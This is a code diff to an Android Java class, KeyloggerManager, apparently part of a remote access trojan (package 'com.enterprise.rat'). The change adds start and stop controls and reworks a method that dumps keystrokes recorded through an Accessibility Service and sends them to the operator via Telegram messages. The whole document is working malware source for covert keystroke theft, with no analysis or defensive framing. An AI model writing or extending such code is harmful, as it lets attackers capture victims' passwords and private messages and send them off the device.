@@ -6,28 +6,27 @@ import com.enterprise.rat.utils.TelegramApi;
 
 public class KeyloggerManager {
     private Context context;
+    private boolean running = false;
 
     public KeyloggerManager(Context context) { this.context = context; }
 
-    public void sendLogs() {
-        AccessibilityService service = AccessibilityService.getInstance();
-        if (service != null) {
-            String logs = service.dumpKeylog();
-            if (logs.isEmpty()) {
-                TelegramApi.sendMessage("⌨ No new logs recorded.");
-            } else {
-                TelegramApi.sendMessage("<b>⌨ Keylogger Data:</b>\n\n<code>" + logs + "</code>");
-            }
-        } else {
-            TelegramApi.sendMessage("❌ Accessibility Service not active.");
-        }
+    public void start() {
+        AccessibilityService svc = AccessibilityService.getInstance();
+        if (svc != null) { svc.clearKeylog(); running = true; TelegramApi.sendMessage("⌨ Keylogger started"); }
+        else TelegramApi.sendMessage("❌ Accessibility Service inactive");
     }
 
-    public void clearLogs() {
-        AccessibilityService service = AccessibilityService.getInstance();
-        if (service != null) {
-            service.clearKeylog();
-            TelegramApi.sendMessage("✅ Logs cleared.");
-        }
+    public void stop() {
+        running = false;
+        TelegramApi.sendMessage("⌨ Keylogger stopped");
+    }
+
+    public void sendLogs() {
+        AccessibilityService svc = AccessibilityService.getInstance();
+        if (svc != null) {
+            String logs = svc.dumpKeylog();
+            if (logs.isEmpty()) TelegramApi.sendMessage("⌨ No logs");
+            else TelegramApi.sendMessage("<b>⌨ Keylogs:</b>\n<code>" + logs + "</code>");
+        } else TelegramApi.sendMessage("❌ Accessibility Service inactive");
     }
 }
